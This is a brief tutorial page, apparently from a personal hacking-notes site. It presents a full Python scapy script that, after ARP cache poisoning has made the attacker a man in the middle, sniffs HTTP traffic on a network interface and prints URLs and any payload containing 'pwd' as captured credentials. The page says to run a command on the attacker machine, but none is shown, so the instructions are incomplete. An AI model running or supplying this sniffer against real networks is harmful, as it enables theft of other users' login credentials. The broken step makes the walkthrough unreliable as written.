---
title: "HTTP credentials sniffing"
date: 2019-01-09
# geekdocFlatSection: false
# geekdocToc: 6
# geekdocHidden: false
---

After we become the [mitm][arp_cache_poisoning] we can sniff all HTTP requests. This time using scapy's buildin sniffing function.   
In the code we are checking for HTTP credentials.  
To get this code to work you first need to run arp cache poisoning and run this command on attacker machine:  

[arp_cache_poisoning]: https://jellepelle.github.io/doc_the_hacks/arp/arp_cache_poisoning/

Full code:  

```python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["pwd"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n[+] Possible username/password > " + login_info + "\n")



sniff("enp7s0")
```
